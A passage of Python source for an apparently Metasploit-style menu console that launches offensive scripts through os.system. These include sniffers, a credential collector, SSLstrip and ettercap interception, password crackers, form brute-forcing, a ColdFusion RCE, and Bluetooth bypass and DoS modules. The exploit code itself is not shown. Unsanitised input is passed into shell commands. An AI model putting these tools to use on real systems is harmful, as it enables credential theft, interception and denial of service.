OPTIONS       | DISCREPTIONS
--------------|----------------------
INTERFACE     | specify interface (eth0, etc).
SAVE_FILE     | specify file name (example: sniffed.pcap)(specify the '.pcap' in the last of file name).

you will specifiy these options when you run or exploit it!
""")
        sssniffersniffer()
    elif scconsole89 == "run":
        os.system('sudo python exploits/sniffer/sniffer.py')
        sssniffersniffer()
    elif scconsole89 == "exploit":
        os.system('sudo python exploits/sniffer/sniffer.py')
        sssniffersniffer()
    elif scconsole89 == "unuse":
        print("unusing sniffer/sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole89 == "exit":
        exit()

def pPOSTrequest():
    scconsole90 = input("sc~" + color.red + "(php/POST-request)" + color.white + ">")
    if scconsole90 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        pPOSTrequest()
    elif scconsole90 == "clear":
        os.system('clear')
        pPOSTrequest()
    elif scconsole90 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt upload url.

you will specifiy these options when you run or exploit it!
""")
        pPOSTrequest()
    elif scconsole90 == "run":
        os.system('python exploits/php/POST-request.py')
        pPOSTrequest()
    elif scconsole90 == "exploit":
        os.system('python exploits/php/POST-request.py')
        pPOSTrequest()
    elif scconsole90 == "unuse":
        print("unusing php/POST-request.")
        time.sleep(0.5)
        Console()
    elif scconsole90 == "exit":
        exit()

def sssniffercredentialcollector():
    scconsole91 = input("sc~" + color.red + "(sniffer/credential-collector)" + color.white + ">")
    if scconsole91 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssniffercredentialcollector()
    elif scconsole91 == "clear":
        os.system('clear')
        sssniffercredentialcollector()
    elif scconsole91 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
INTERFACE     | specify interface (eth0, etc).
SAVE_FILE     | specify file name (example: sniffed.pcap)(specify the '.pcap' in the last of file name).

you will specifiy these options when you run or exploit it!
""")
        sssniffercredentialcollector()
    elif scconsole91 == "run":
        os.system('sudo python exploits/sniffer/credential-collector.py')
        sssniffercredentialcollector()
    elif scconsole91 == "exploit":
        os.system('sudo python exploits/sniffer/credential-collector.py')
        sssniffercredentialcollector()
    elif scconsole91 == "unuse":
        print("unusing sniffer/credential-collector.")
        time.sleep(0.5)
        Console()
    elif scconsole91 == "exit":
        exit()

def aauxiliarypasswordcrackingcrackzip():
    scconsole92 = input("sc~" + color.red + "(auxiliary/password_cracking/crack-zip)" + color.white + ">")
    if scconsole92 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole92 == "clear":
        os.system('clear')
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole92 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
ZIP_FILE      | specify the zip file to crack (with exension!).
WORDLIST      | specify the wordlist to crack with it.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole92 == "run":
        os.system('python exploits/auxiliary/password_cracking/crack-zip.py')
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole92 == "exploit":
        os.system('python exploits/auxiliary/password_cracking/crack-zip.py')
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole92 == "unuse":
        print("unusing auxiliary/password_cracking/crack-zip.")
        time.sleep(0.5)
        Console()
    elif scconsole92 == "exit":
        exit()

def aauxiliarypasswordcrackingcrackpdf():
    scconsole93 = input("sc~" + color.red + "(auxiliary/password_cracking/crack-pdf)" + color.white + ">")
    if scconsole93 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole93 == "clear":
        os.system('clear')
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole93 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
PDF_FILE      | specify the pdf file to crack (with exension!).
WORDLIST      | specify the wordlist to crack with it.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole93 == "run":
        os.system('python exploits/auxiliary/password_cracking/crack-pdf.py')
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole93 == "exploit":
        os.system('python exploits/auxiliary/password_cracking/crack-pdf.py')
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole93 == "unuse":
        print("unusing auxiliary/password_cracking/crack-pdf.")
        time.sleep(0.5)
        Console()
    elif scconsole93 == "exit":
        exit()

def aauxiliarypasswordcrackingcrackrar():
    scconsole94 = input("sc~" + color.red + "(auxiliary/password_cracking/crack-rar)" + color.white + ">")
    if scconsole94 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole94 == "clear":
        os.system('clear')
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole94 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RAR_FILE      | specify the rar file to crack (with exension!).
WORDLIST      | specify the wordlist to crack with it.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole94 == "run":
        os.system('python exploits/auxiliary/password_cracking/crack-rar.py')
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole94 == "exploit":
        os.system('python exploits/auxiliary/password_cracking/crack-rar.py')
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole94 == "unuse":
        print("unusing auxiliary/password_cracking/crack-rar.")
        time.sleep(0.5)
        Console()
    elif scconsole94 == "exit":
        exit()

def aauxiliarypasswordcrackingcrackoffice():
    scconsole95 = input("sc~" + color.red + "(auxiliary/password_cracking/crack-office)" + color.white + ">")
    if scconsole95 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole95 == "clear":
        os.system('clear')
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole95 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RAR_FILE      | specify the office file to crack (with exension!).
WORDLIST      | specify the wordlist to crack with it.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole95 == "run":
        officefilename = input("Enter Office file(with exension ---> .docx): ")
        officewordlist = input("Enter path of your wordlist: ")
        os.system(f'python exploits/auxiliary/password_cracking/crack-office.py {officefilename} {officewordlist}')
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole95 == "exploit":
        officefilename2 = input("Enter Office file(with exension ---> .docx): ")
        officewordlist2 = input("Enter path of your wordlist: ")
        os.system(f'python exploits/auxiliary/password_cracking/crack-office.py {officefilename} {officewordlist}')
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole95 == "unuse":
        print("unusing auxiliary/password_cracking/crack-rar.")
        time.sleep(0.5)
        Console()
    elif scconsole95 == "exit":
        exit()

def sssnifferinspecttraffic():
    scconsole96 = input("sc~" + color.red + "(sniffer/inspect_traffic)" + color.white + ">")
    if scconsole96 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssnifferinspecttraffic()
    elif scconsole96 == "clear":
        os.system('clear')
        sssnifferinspecttraffic()
    elif scconsole96 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
INTERFACE     | specify interface (eth0, etc).

you will specifiy these options when you run or exploit it!
""")
        sssnifferinspecttraffic()
    elif scconsole96 == "run":
        os.system('sudo python exploits/sniffer/inspect_traffic.py')
        sssnifferinspecttraffic()
    elif scconsole96 == "exploit":
        os.system('sudo python exploits/sniffer/inspect_traffic.py')
        sssnifferinspecttraffic()
    elif scconsole96 == "unuse":
        print("unusing sniffer/inspect_traffic.")
        time.sleep(0.5)
        Console()
    elif scconsole96 == "exit":
        exit()

def aauxiliarypasswordcrackingcrackwindowshash():
    scconsole97 = input("sc~" + color.red + "(auxiliary/password_cracking/crack-windows-hash)" + color.white + ">")
    if scconsole97 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole97 == "clear":
        os.system('clear')
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole97 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
HASH          | specify the windows hash.
WORDLIST      | specify the wordlist to crack with it.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole97 == "run":
        windowshash = input("Enter Windows Hash: ")
        windowswordlist = input("Enter path of your wordlist: ")
        os.system(f'python exploits/auxiliary/password_cracking/crack-windows-hash.py {windowshash} {windowswordlist}')
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole97 == "exploit":
        windowshash2 = input("Enter Windows Hash: ")
        windowswordlist2 = input("Enter path of your wordlist: ")
        os.system(f'python exploits/auxiliary/password_cracking/crack-windows-hash.py {windowshash2} {windowswordlist2}')
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole97 == "unuse":
        print("unusing auxiliary/password_cracking/crack-windows-hash.")
        time.sleep(0.5)
        Console()
    elif scconsole97 == "exit":
        exit()

def sssnifferSSLstrip():
    scconsole98 = input("sc~" + color.red + "(sniffer/SSLstrip)" + color.white + ">")
    if scconsole98 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssnifferSSLstrip()
    elif scconsole98 == "clear":
        os.system('clear')
        sssnifferSSLstrip()
    elif scconsole98 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
INTERFACE     | specify interface (eth0, etc).

you will specifiy these options when you run or exploit it!
""")
        sssnifferSSLstrip()
    elif scconsole98 == "run":
        os.system('sudo python exploits/sniffer/SSLstrip.py')
        sssnifferSSLstrip()
    elif scconsole98 == "exploit":
        os.system('sudo python exploits/sniffer/SSLstrip.py')
        sssnifferSSLstrip()
    elif scconsole98 == "unuse":
        print("unusing sniffer/SSLstrip.")
        time.sleep(0.5)
        Console()
    elif scconsole98 == "exit":
        exit()

def sssniffertcpdumpsniffer():
    scconsole99 = input("sc~" + color.red + "(sniffer/tcpdump-sniffer)" + color.white + ">")
    if scconsole99 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssniffertcpdumpsniffer()
    elif scconsole99 == "clear":
        os.system('clear')
        sssniffertcpdumpsniffer()
    elif scconsole99 == "show options":
        print("""
OPTIONS        | DISCREPTIONS
---------------|----------------------
INTERFACE      | specify interface (eth0, etc).
FILE_NAME      | specify the file name to save.
CAPTURE_FILTER | specify the capture filter.

you will specifiy these options when you run or exploit it!
""")
        sssniffertcpdumpsniffer()
    elif scconsole99 == "run":
        os.system('sudo python exploits/sniffer/tcpdump-sniffer.py')
        sssniffertcpdumpsniffer()
    elif scconsole99 == "exploit":
        os.system('sudo python exploits/sniffer/tcpdump-sniffer.py')
        sssniffertcpdumpsniffer()
    elif scconsole99 == "unuse":
        print("unusing sniffer/tcpdump-sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole99 == "exit":
        exit()

def sssnifferettercapsniffer():
    scconsole100 = input("sc~" + color.red + "(sniffer/ettercap-sniffer)" + color.white + ">")
    if scconsole100 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssnifferettercapsniffer()
    elif scconsole100 == "clear":
        os.system('clear')
        sssnifferettercapsniffer()
    elif scconsole100 == "show options":
        print("""
OPTIONS        | DISCREPTIONS
---------------|----------------------
RHOST          | specify target ip address.
GATEWAY        | specify the gateway ip address.
INTERFACE      | specify interface (eth0, etc).

you will specifiy these options when you run or exploit it!
""")
        sssnifferettercapsniffer()
    elif scconsole100 == "run":
        os.system('sudo python exploits/sniffer/ettercap-sniffer.py')
        sssnifferettercapsniffer()
    elif scconsole100 == "exploit":
        os.system('sudo python exploits/sniffer/ettercap-sniffer.py')
        sssnifferettercapsniffer()
    elif scconsole100 == "unuse":
        print("unusing sniffer/ettercap-sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole100 == "exit":
        exit()

def sssniffertsharksniffer():
    scconsole101 = input("sc~" + color.red + "(sniffer/tshark-sniffer)" + color.white + ">")
    if scconsole101 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssniffertsharksniffer()
    elif scconsole101 == "clear":
        os.system('clear')
        sssniffertsharksniffer()
    elif scconsole101 == "show options":
        print("""
OPTIONS        | DISCREPTIONS
---------------|----------------------
INTERFACE      | specify interface (eth0, etc).
FILE_NAME      | specify the file name to save.
CAPTURE_FILTER | specify the capture filter.

you will specifiy these options when you run or exploit it!
""")
        sssniffertsharksniffer()
    elif scconsole101 == "run":
        os.system('sudo python exploits/sniffer/tshark-sniffer.py')
        sssniffertsharksniffer()
    elif scconsole101 == "exploit":
        os.system('sudo python exploits/sniffer/tshark-sniffer.py')
        sssniffertsharksniffer()
    elif scconsole101 == "unuse":
        print("unusing sniffer/tshark-sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole101 == "exit":
        exit()

def aauxiliarypipeauditor():
    scconsole102 = input("sc~" + color.red + "(auxiliary/pipe_auditor)" + color.white + ">")
    if scconsole102 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypipeauditor()
    elif scconsole102 == "clear":
        os.system('clear')
        aauxiliarypipeauditor()
    elif scconsole102 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
SERVER_IP     | specify the server ip address.
SHARE         | specify the share name.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypipeauditor()
    elif scconsole102 == "run":
        os.system('python exploits/auxiliary/pipe_auditor.py')
        aauxiliarypipeauditor()
    elif scconsole102 == "exploit":
        os.system('python exploits/auxiliary/pipe_auditor.py')
        aauxiliarypipeauditor()
    elif scconsole102 == "unuse":
        print("unusing auxiliary/pipe_auditor.")
        time.sleep(0.5)
        Console()
    elif scconsole102 == "exit":
        exit()

def aauxiliarysmbenumshares():
    scconsole103 = input("sc~" + color.red + "(auxiliary/smb_enumshares)" + color.white + ">")
    if scconsole103 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarysmbenumshares()
    elif scconsole103 == "clear":
        os.system('clear')
        aauxiliarysmbenumshares()
    elif scconsole103 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
SERVER_IP     | specify the server ip address.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarysmbenumshares()
    elif scconsole103 == "run":
        os.system('python exploits/auxiliary/smb_enumshares.py')
        aauxiliarysmbenumshares()
    elif scconsole103 == "exploit":
        os.system('python exploits/auxiliary/smb_enumshares.py')
        aauxiliarysmbenumshares()
    elif scconsole103 == "unuse":
        print("unusing auxiliary/smb_enumshares.")
        time.sleep(0.5)
        Console()
    elif scconsole103 == "exit":
        exit()

def aauxiliarywebspider():
    scconsole104 = input("sc~" + color.red + "(auxiliary/web-spider)" + color.white + ">")
    if scconsole104 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarywebspider()
    elif scconsole104 == "clear":
        os.system('clear')
        aauxiliarywebspider()
    elif scconsole104 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarywebspider()
    elif scconsole104 == "run":
        os.system('python exploits/auxiliary/web-spider.py')
        aauxiliarywebspider()
    elif scconsole104 == "exploit":
        os.system('python exploits/auxiliary/web-spider.py')
        aauxiliarywebspider()
    elif scconsole104 == "unuse":
        print("unusing auxiliary/web-spider.")
        time.sleep(0.5)
        Console()
    elif scconsole104 == "exit":
        exit()

def aauxiliaryapachemodstatus():
    scconsole105 = input("sc~" + color.red + "(auxiliary/apache_mod_status)" + color.white + ">")
    if scconsole105 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryapachemodstatus()
    elif scconsole105 == "clear":
        os.system('clear')
        aauxiliaryapachemodstatus()
    elif scconsole105 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryapachemodstatus()
    elif scconsole105 == "run":
        os.system('python exploits/auxiliary/apache_mod_status.py')
        aauxiliaryapachemodstatus()
    elif scconsole105 == "exploit":
        os.system('python exploits/auxiliary/apache_mod_status.py')
        aauxiliaryapachemodstatus()
    elif scconsole105 == "unuse":
        print("unusing auxiliary/apache_mod_status.")
        time.sleep(0.5)
        Console()
    elif scconsole105 == "exit":
        exit()

def aauxiliarycoldfusionrce():
    scconsole106 = input("sc~" + color.red + "(auxiliary/coldfusion_rce)" + color.white + ">")
    if scconsole106 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarycoldfusionrce()
    elif scconsole106 == "clear":
        os.system('clear')
        aauxiliarycoldfusionrce()
    elif scconsole106 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.
PAYLOAD       | specify the payload you want.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarycoldfusionrce()
    elif scconsole106 == "run":
        urltarget111 = input("Enter target URL: ")
        payloadtarget111 = input("Enter the PAYLOAD: ")
        os.system(f'python exploits/auxiliary/coldfusion_rce.py {urltarget111} {payloadtarget111}')
        aauxiliarycoldfusionrce()
    elif scconsole106 == "exploit":
        urltarget112 = input("Enter target URL: ")
        payloadtarget112 = input("Enter the PAYLOAD: ")
        os.system(f'python exploits/auxiliary/coldfusion_rce.py {urltarget112} {payloadtarget112}')
        aauxiliarycoldfusionrce()
    elif scconsole106 == "unuse":
        print("unusing auxiliary/coldfusion_rce.")
        time.sleep(0.5)
        Console()
    elif scconsole106 == "exit":
        exit()

def aauxiliaryhttpformbrute():
    scconsole107 = input("sc~" + color.red + "(auxiliary/http-form-brute)" + color.white + ">")
    if scconsole107 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryhttpformbrute()
    elif scconsole107 == "clear":
        os.system('clear')
        aauxiliaryhttpformbrute()
    elif scconsole107 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.
USERNAMEFIELD | specify the username field.
PASSWORDFIELD | specify the password field.
USERNAMELIST  | specify the username list.
PASSWORDLIST  | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryhttpformbrute()
    elif scconsole107 == "run":
        urltarget113 = input("Enter target URL: ")
        usernamefield1 = input("USERNAMEFIELD: ")
        passwordfield1 = input("PASSWORDFIELD: ")
        usernamelist123 = input("USERNAMELIST: ")
        passwordlist123 = input("PASSWORDLIST: ")
        os.system(f'python exploits/auxiliary/http-form-brute.py {urltarget113} {usernamefield1} {passwordfield1} {usernamelist123} {passwordlist123}')
        aauxiliaryhttpformbrute()
    elif scconsole107 == "exploit":
        urltarget114 = input("Enter target URL: ")
        usernamefield2 = input("USERNAMEFIELD: ")
        passwordfield2 = input("PASSWORDFIELD: ")
        usernamelist122 = input("USERNAMELIST: ")
        passwordlist122 = input("PASSWORDLIST: ")
        os.system(f'python exploits/auxiliary/http-form-brute.py {urltarget114} {usernamefield2} {passwordfield2} {usernamelist122} {passwordlist122}')
        aauxiliaryhttpformbrute()
    elif scconsole107 == "unuse":
        print("unusing auxiliary/http-form-brute.")
        time.sleep(0.5)
        Console()
    elif scconsole107 == "exit":
        exit()

def multinmapversiondetection():
    scconsole108 = input("sc~" + color.red + "(multi/nmap-version-detection)" + color.white + ">")
    if scconsole108 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multinmapversiondetection()
    elif scconsole108 == "clear":
        os.system('clear')
        multinmapversiondetection()
    elif scconsole108 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address.

you will specifiy these options when you run or exploit it!
""")
        multinmapversiondetection()
    elif scconsole108 == "run":
        os.system('python exploits/multi/nmap-version-detection.py')
        multinmapversiondetection()
    elif scconsole108 == "exploit":
        os.system('python exploits/multi/nmap-version-detection.py')
        multinmapversiondetection()
    elif scconsole108 == "unuse":
        print("unusing multi/nmap-version-detection.")
        time.sleep(0.5)
        Console()
    elif scconsole108 == "exit":
        exit()

def snifferblescanner():
    scconsole109 = input("sc~" + color.red + "(sniffer/ble-scanner)" + color.white + ">")
    if scconsole109 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        snifferblescanner()
    elif scconsole109 == "clear":
        os.system('clear')
        snifferblescanner()
    elif scconsole109 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        snifferblescanner()
    elif scconsole109 == "run":
        os.system('sudo python exploits/sniffer/ble-scanner.py')
        snifferblescanner()
    elif scconsole109 == "exploit":
        os.system('sudo python exploits/sniffer/ble-scanner.py')
        snifferblescanner()
    elif scconsole109 == "unuse":
        print("unusing sniffer/ble-scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole109 == "exit":
        exit()

def multiblebypass():
    scconsole110 = input("sc~" + color.red + "(multi/ble-bypass)" + color.white + ">")
    if scconsole110 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multiblebypass()
    elif scconsole110 == "clear":
        os.system('clear')
        multiblebypass()
    elif scconsole110 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
BLE_ADDRESS   | specify target bluetooth address of target device.

you will specifiy these options when you run or exploit it!
""")
        multiblebypass()
    elif scconsole110 == "run":
        os.system('sudo python exploits/multi/ble-bypass.py')
        multiblebypass()
    elif scconsole110 == "exploit":
        os.system('sudo python exploits/multi/ble-bypass.py')
        multiblebypass()
    elif scconsole110 == "unuse":
        print("unusing multi/ble-bypass.")
        time.sleep(0.5)
        Console()
    elif scconsole110 == "exit":
        exit()

def multiblescanner():
    scconsole111 = input("sc~" + color.red + "(multi/ble-scanner)" + color.white + ">")
    if scconsole111 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multiblescanner()
    elif scconsole111 == "clear":
        os.system('clear')
        multiblescanner()
    elif scconsole111 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        multiblescanner()
    elif scconsole111 == "run":
        os.system('sudo python exploits/multi/ble-scanner.py')
        multiblescanner()
    elif scconsole111 == "exploit":
        os.system('sudo python exploits/multi/ble-scanner.py')
        multiblescanner()
    elif scconsole111 == "unuse":
        print("unusing multi/ble-scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole111 == "exit":
        exit()

def dosbledos():
    scconsole112 = input("sc~" + color.red + "(dos/ble-dos)" + color.white + ">")
    if scconsole112 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        dosbledos()
    elif scconsole112 == "clear":
        os.system('clear')
        dosbledos()
    elif scconsole112 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
BLE_ADDRESS   | specify target bluetooth address of target device.

you will specifiy these options when you run or exploit it!
""")
        dosbledos()
    elif scconsole112 == "run":
        os.system('sudo python exploits/dos/ble-dos.py')
        dosbledos()
    elif scconsole112 == "exploit":
        os.system('sudo python exploits/dos/ble-dos.py')
        dosbledos()
    elif scconsole112 == "unuse":
        print("unusing dos/ble-dos.")
        time.sleep(0.5)
        Console()
    elif scconsole112 == "exit":
        exit()

def scannerportscantcp():
    scconsole113 = input("sc~" + color.red + "(scanner/portscan-tcp)" + color.white + ">")
    if scconsole113 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerportscantcp()
    elif scconsole113 == "clear":
        os.system('clear')
        scannerportscantcp()
    elif scconsole113 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address or website.
START_PORT    | specify the starting port.
END_PORT      | specify the ending port.

you will specifiy these options when you run or exploit it!
""")
        scannerportscantcp()
    elif scconsole113 == "run":
        os.system('python exploits/scanner/portscan-tcp.py')
        scannerportscantcp()
    elif scconsole113 == "exploit":
        os.system('python exploits/scanner/portscan-tcp.py')
        scannerportscantcp()
    elif scconsole113 == "unuse":
        print("unusing scanner/portscan-tcp.")
        time.sleep(0.5)
        Console()
    elif scconsole113 == "exit":
        exit()

def scannerblescanner():
    scconsole114 = input("sc~" + color.red + "(scanner/ble-scanner)" + color.white + ">")
    if scconsole114 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerblescanner()
    elif scconsole114 == "clear":
        os.system('clear')
        scannerblescanner()
    elif scconsole114 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        scannerblescanner()
    elif scconsole114 == "run":
        os.system('sudo python exploits/scanner/ble-scanner.py')
        scannerblescanner()
    elif scconsole114 == "exploit":
        os.system('sudo python exploits/scanner/ble-scanner.py')
        scannerblescanner()
    elif scconsole114 == "unuse":
        print("unusing scanner/ble-scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole114 == "exit":
        exit()

def scannervncnoneauth():
    scconsole115 = input("sc~" + color.red + "(scanner/vnc-none-auth)" + color.white + ">")
    if scconsole115 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannervncnoneauth()
    elif scconsole115 == "clear":
        os.system('clear')
        scannervncnoneauth()
    elif scconsole115 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address.
RPORT         | specifed as 5900 (VNC port).

you will specifiy these options when you run or exploit it!
""")
        scannervncnoneauth()
    elif scconsole115 == "run":
        os.system('python exploits/scanner/vnc-none-auth.py')
        scannervncnoneauth()
    elif scconsole115 == "exploit":
        os.system('python exploits/scanner/vnc-none-auth.py')
        scannervncnoneauth()
    elif scconsole115 == "unuse":
        print("unusing scanner/vnc-none-auth.")
        time.sleep(0.5)
        Console()
    elif scconsole115 == "exit":
        exit()

def scannerftpanon():
